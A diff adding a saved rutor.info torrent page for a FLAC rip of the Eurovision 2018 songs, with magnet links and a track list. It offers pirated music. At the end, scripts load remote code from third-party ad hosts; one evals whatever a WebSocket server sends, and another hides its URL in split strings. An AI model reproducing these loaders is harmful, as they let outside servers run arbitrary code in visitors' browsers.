@@ -1,0 +1,448 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: VA - Eurovision Song Contest Lisbon (2018) FLAC</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>VA - Eurovision Song Contest Lisbon (2018) FLAC</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:56669a964cdc55516de98295c370ae3b81ac3d51&amp;dn=rutor.info_VA+-+Eurovision+Song+Contest+Lisbon+%282018%29+FLAC&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630475"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630475"><img src="http://s.rutor.info/t/down.png"> Скачать VA_-_Eurovision_Song_Contest_Lisbon_2018_FLAC.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="https://a.radikal.ru/a04/1805/20/288aad79aa9f.png" /><br />
+<br />
+<b>Исполнитель</b>: <span style="color:blue;">VA</span><br />
+<b>Название</b>: <span style="color:blue;">Eurovision Song Contest Lisbon</span><br />
+<b>Год</b>: <span style="color:blue;">2018</span><br />
+<b>Жанр</b>:  <a href="/tag/2/Pop" target="_blank">Pop</a><br />
+<b>Продолжительность</b>: <span style="color:blue;">02:09:06</span><br />
+<b>Формат/Кодек</b>: <span style="color:blue;">FLAC</span><br />
+<b>Битрейт аудио</b>: <span style="color:blue;">Lossless</span><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">ТрекЛист</div><div class="hidebody"></div><textarea class="hidearea"><br />
+01. Mall (Eurovision 2018 - Albania) Eugent Bushpepa (3:07)<br />
+02. Qami (Eurovision 2018 - Armenia) Sevak Khanagyan (2:57)<br />
+03. We Got Love (Eurovision 2018 - Australia) Jessica Mauboy (3:04)<br />
+04. Nobody But You (Eurovision 2018 - Austria) Cesar Sampson (3:03)<br />
+05. X My Heart (Eurovision 2018 - Azerbaijan) Aisel (3:01)<br />
+06. A Matter of Time (Eurovision 2018 - Belgium) Sennek (3:00)<br />
+07. Bones (Eurovision 2018 - Bulgaria) Equinox (2:59)<br />
+08. Forever (Eurovision 2018 - Belarus) ALEKSEEV (3:00)<br />
+09. Stones (Eurovision 2018 - Switzerland) ZiBBZ (2:57)<br />
+10. Fuego (Eurovision 2018 - Cyprus) Eleni Foureira (3:03)<br />
+11. Lie To Me (Eurovision 2018 - Czech Republic) Mikolas Josef (2:50)<br />
+12. You Let Me Walk Alone (Eurovision 2018 - Germany) Michael Schulte (2:57)<br />
+13. Higher Ground (Eurovision 2018 - Denmark) Rasmussen (3:03)<br />
+14. Tu Cancion (Eurovision 2018 - Spain) Amaia Romero &amp; Alfred Garcia (2:59)<br />
+15. La Forza (Eurovision 2018 - Estonia) Elina Nechayeva (3:04)<br />
+16. Monsters (Eurovision 2018 - Finland) Saara Aalto (3:00)<br />
+17. Mercy (Eurovision 2018 - France) Madame Monsieur (3:02)<br />
+18. Storm (Eurovision 2018 - United Kingdom) SuRie (2:57)<br />
+19. For You (Eurovision 2018 - Georgia )Ethno - Jazz Band Iriao (2:59)<br />
+20. Oniro Mou (Eurovision 2018 - Greece) Yianna Terzi (3:04)<br />
+21. Crazy (Eurovision 2018 - Croatia) Franka (2:59)<br />
+22. Viszlat Nyar (Eurovision 2018 - Hungary) AWS (2:57)<br />
+23. Together (Eurovision 2018 - Ireland) Ryan O&#039;Shaughnessy (2:54)<br />
+24. Our Choice (Eurovision 2018 - Iceland) Ari Olafsson (2:59)<br />
+25. Toy (Eurovision 2018 - Israel) Netta (3:00)<br />
+26. Non Mi Avete Fatto Niente (Eurovision 2018 - Italy) Ermal Meta &amp; Fabrizio Moro (3:02)<br />
+27. When We’re Old (Eurovision 2018 - Lithuania) Ieva Zasimauskaite (3:00)<br />
+28. Funny Girl (Eurovision 2018 - Latvia) Laura Rizzotto (3:03)<br />
+29. My Lucky Day (Eurovision 2018 - Moldova) DoReDoS (3:02)<br />
+30. Lost and Found (Eurovision 2018 - F.Y.R. Macedonia) Eye Cue (3:03)<br />
+31. Taboo (Eurovision 2018 - Malta) Christabelle (3:01)<br />
+32. Inje (Eurovision 2018 - Montenegro) Vanja Radovanovic (3:00)<br />
+33. Outlaw In &#039;Em (Eurovision 2018 - The Netherlands) Waylon (2:54)<br />
+34. That&#039;s How You Write a Song (Eurovision 2018 - Norway) Alexander Rybak (3:00)<br />
+35. Light Me Up (feat. Lukas Meijer) [Eurovision 2018 - Poland] Gromee (3:00)<br />
+36. O Jardim (feat. Isaura) [Eurovision 2018 – Portugal] Claudia Pascoal (2:38)<br />
+37. Goodbye (Eurovision 2018 - Romania) The Humans (2:58)<br />
+38. I Won’t Break (Eurovision 2018 - Russia) Julia Samoylova (2:59)<br />
+39. Who We Are (feat. Jenifer Brening) [Eurovision 2018 - San Marino] Jessika (3:00)<br />
+40. Nova Deca (Eurovision 2018 - Serbia) Sanja Ilic &amp; Balkanika (3:07)<br />
+41. Hvala, Ne! (Eurovision 2018 - Slovenia)Lea Sirk (3:00)<br />
+42. Dance You Off (Eurovision 2018 - Sweden)Benjamin Ingrosso (3:00)<br />
+43. Under the Ladder (Eurovision 2018 - Ukraine) MELOVIN (2:59)<br />
+</textarea></div><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">AudioChecker</div><div class="hidebody"></div><textarea class="hidearea"><br />
+Путь: ...CD1<br />
+<br />
+01 -=- 01 Eugent Bushpepa - Mall (Albania).flac -=- CDDA (100%)<br />
+02 -=- 02 Sevak Khanagyan - Qami (Armenia).flac -=- CDDA (54%)<br />
+03 -=- 03 Jessica Mauboy - We Got Love (Australia).flac -=- MPEG (89%)<br />
+04 -=- 04 Cesar Sampson - Nobody But You (Austria).flac -=- CDDA (99%)<br />
+05 -=- 05 Aisel - X My Heart (Azerbaijan).flac -=- CDDA (94%)<br />
+06 -=- 06 Sennek - A Matter Of Time (Belgium).flac -=- CDDA (100%)<br />
+07 -=- 07 Equinox - Bones (Bulgaria).flac -=- CDDA (100%)<br />
+08 -=- 08 ALEKSEEV - Forever (Belarus).flac -=- CDDA (100%)<br />
+09 -=- 09 ZiBBZ - Stones (Switzerland).flac -=- CDDA (100%)<br />
+10 -=- 10 Eleni Foureira - Fuego (Cyprus).flac -=- CDDA (100%)<br />
+11 -=- 11 Mikolas Josef - Lie To Me (Czech Republic).flac -=- CDDA (100%)<br />
+12 -=- 12 Michael Schulte - You Let Me Walk Alone (Germany).flac -=- CDDA (100%)<br />
+13 -=- 13 Rasmussen - Higher Ground (Denmark).flac -=- CDDA (100%)<br />
+14 -=- 14 Amaia Y Alfred - Tu Cancion (Spain).flac -=- CDDA (100%)<br />
+15 -=- 15 Elina Nechayeva - La Forza (Estonia).flac -=- CDDA (100%)<br />
+16 -=- 16 Saara Aalto - Monsters (Finland).flac -=- CDDA (100%)<br />
+17 -=- 17 Madame Monsieur - Mercy (France).flac -=- CDDA (100%)<br />
+18 -=- 18 SuRie - Storm (United Kingdom).flac -=- CDDA (100%)<br />
+19 -=- 19 Ethno Jazz Band Iriao - For You (Georgia).flac -=- CDDA (100%)<br />
+20 -=- 20 Yianna Terzi - Oniro Mou (Greece).flac -=- CDDA (99%)<br />
+21 -=- 21 Franka - Crazy (Croatia).flac -=- CDDA (99%)<br />
+22 -=- 22 AWS - Viszlat Nyar (Hungary).flac -=- CDDA (100%)<br />
+<br />
+Сводка 93,45% CDDA<br />
+<br />
+62301044<br />
+<br />
+Путь: ...CD2<br />
+<br />
+01 -=- 01 Ryan O&#039;Shaughnessy - Together (Ireland).flac -=- CDDA (100%)<br />
+02 -=- 02 Ari Olafsson - Our Choice (Iceland).flac -=- CDDA (100%)<br />
+03 -=- 03 Netta - TOY (Israel).flac -=- CDDA (100%)<br />
+04 -=- 04 Ermal Meta &amp; Fabrizio Moro - Non Mi Avete Fatto Niente (Italy).flac -=- CDDA (100%)<br />
+05 -=- 05 Ieva Zasimauskaite - When We&#039;re Old (Lithuania).flac -=- CDDA (43%)<br />
+06 -=- 06 Laura Rizzotto - Funny Girl (Latvia).flac -=- CDDA (100%)<br />
+07 -=- 07 DoReDoS - My Lucky Day (Moldova).flac -=- CDDA (99%)<br />
+08 -=- 08 Eye Cue - Lost And Found (FYR Macedonia).flac -=- CDDA (99%)<br />
+09 -=- 09 Christabelle - Taboo (Malta).flac -=- CDDA (100%)<br />
+10 -=- 10 Vanja Radovanovic - Inje (Montenegro).flac -=- CDDA (100%)<br />
+11 -=- 11 Waylon - Outlaw In &#039;Em (The Netherlands).flac -=- CDDA (100%)<br />
+12 -=- 12 Alexander Rybak - That&#039;s How You Write A Song (Norway).flac -=- CDDA (100%)<br />
+13 -=- 13 Gromee - Light Me Up (feat. Lukas Meijer) (Poland).flac -=- CDDA (100%)<br />
+14 -=- 14 Claudia Pascoal - O Jardim (feat. Isaura) (Portugal).flac -=- CDDA (100%)<br />
+15 -=- 15 The Humans - Goodbye (Romania).flac -=- CDDA (99%)<br />
+16 -=- 16 Julia Samoylova - I Won&#039;t Break (Russia).flac -=- CDDA (100%)<br />
+17 -=- 17 Jessika - Who We Are (feat. Jenifer Brening) (San Marino).flac -=- CDDA (100%)<br />
+18 -=- 18 Sanja Iliс &amp; Balkanika - Nova Deca (Serbia).flac -=- CDDA (100%)<br />
+19 -=- 19 Lea Sirk - Hvala, Ne! (Slovenia).flac -=- CDDA (100%)<br />
+20 -=- 20 Benjamin Ingrosso - Dance You Off (Sweden).flac -=- CDDA (100%)<br />
+21 -=- 21 MELOVIN - Under The Ladder (Ukraine).flac -=- CDDA (100%)<br />
+<br />
+Сводка 97,14% CDDA<br />
+<br />
+92755140<br />
+</textarea></div><br />
+<br />
+<i><b><span style="color:blue;">Внимание!</span></b></i>: Все аудиозаписи предназначены исключительно для предварительного ознакомительного прослушивания. Все права на исходные аудиоматериалы принадлежат соответствующим организациям и частным лицам. Если вы оставляете у себя в каком-либо виде эти аудиозаписи после ознакомительного прослушивания, но не приобретаете соответствующую лицензионную запись - вы нарушаете закон об авторском праве, что может повлечь за собой преследование по соответствующим статьям существующего законодательства.</td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1161898/0" target="_blank">Radjah</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/audio" target="_blank">Музыка</a></td></tr>
+<tr><td class="header">Раздают</td><td>22</td></tr>
+<tr><td class="header">Качают</td><td>13</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (19 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 12:35:19  (20 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>889.57&nbsp;MB  (932785305 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630475);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630552"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d26947eb1a65d48f35b0637705f064114ed4b9d5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630552/va-funky-disco-house-grooves-vol.10-2018-mp3">VA - Funky Disco House Grooves Vol.10 (2018) MP3 </a></td> 
+<td align="right">344.17&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;24</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630494"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:10717d6e07240796265fca9bcf0fd8303cfd91a6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630494/va-eye-in-the-sky-music-for-dreams-2018-mp3">VA - Eye In The Sky: Music For Dreams (2018) MP3 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.21&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;53</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;24</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630515"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4bc8c481af5df7d938f09acd36a7e32082dd370f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630515/va-dance-club-2018.02-2018-mp3">VA - Dance Club 2018.02 (2018) MP3 </a></td> 
+<td align="right">271.84&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;37</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630506"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a4c776fb527106647be96c36071b6630c55e9725&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630506/va-bravo-hits-90s-2cd-2018-mp3">VA - Bravo Hits 90&#039;s [2CD] (2018) MP3 </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">364.80&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;46</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;8</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630480"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:80e6ab57e75748901b46a264480b198b6cb9a21d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630480/va-80s-metal-gold-2cd-2007-flac">VA - 80&#039;s Metal Gold [2CD] (2007) FLAC </a></td> 
+<td align="right">1.00&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;30</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;10</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630459"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:763b4ea75a7a95368d985bfeff6534ff54ec0256&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630459/va-nrj-urban-latino-hits-only-2cd-2018-mp3">VA - NRJ Urban Latino Hits Only [2CD] (2018) MP3 </a></td> 
+<td align="right">307.46&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630438"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a7e92fa5e6c027da04b3ba792872ba14c593a9f3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630438/va-noventeros-mix-blanco-y-negro-2018-mp3">VA - Noventeros Mix: Blanco Y Negro (2018) MP3 </a></td> 
+<td align="right">333.14&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/2/0/0/VA" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630475.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (46)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630475">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630475);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630475);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630475">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
